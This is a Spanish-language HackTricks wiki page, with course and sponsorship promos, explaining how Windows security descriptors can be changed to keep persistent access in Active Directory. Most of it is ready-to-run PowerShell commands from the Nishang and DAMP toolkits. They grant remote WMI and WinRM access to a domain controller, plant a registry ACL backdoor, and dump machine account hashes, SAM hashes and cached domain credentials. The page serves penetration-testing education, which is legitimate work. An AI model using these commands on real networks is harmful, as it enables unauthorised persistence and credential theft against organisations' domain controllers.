# Descriptores de Seguridad

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red de HackTricks AWS)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Descriptores de Seguridad

[Desde la documentación](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): El Lenguaje de Definición de Descriptores de Seguridad (SDDL, por sus siglas en inglés) define el formato que se utiliza para describir un descriptor de seguridad. SDDL utiliza cadenas ACE para DACL y SACL: `tipo_ace;banderas_ace;derechos;guid_objeto;guid_objeto_heredado;sid_cuenta;`

Los **descriptores de seguridad** se utilizan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si puedes **realizar** un **pequeño cambio** en el **descriptor de seguridad** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesidad de ser miembro de un grupo privilegiado.

Entonces, esta técnica de persistencia se basa en la capacidad de obtener todos los privilegios necesarios sobre ciertos objetos, para poder realizar una tarea que normalmente requiere privilegios de administrador pero sin necesidad de ser administrador.

### Acceso a WMI

Puedes dar a un usuario acceso para **ejecutar de forma remota WMI** [**usando esto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Acceso a WinRM

Dar acceso a la **consola de PS de WinRM a un usuario** [**usando esto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Acceso remoto a hashes

Acceda al **registro** y **extraiga los hashes** creando una **puerta trasera de Reg usando** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** para que en cualquier momento pueda recuperar el **hash de la computadora**, el **SAM** y cualquier **credencial AD en caché** en la computadora. Por lo tanto, es muy útil otorgar este permiso a un **usuario regular contra una computadora del Controlador de Dominio**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Revisa [**Tickets de Plata**](silver-ticket.md) para aprender cómo podrías usar el hash de la cuenta de computadora de un Controlador de Dominio.
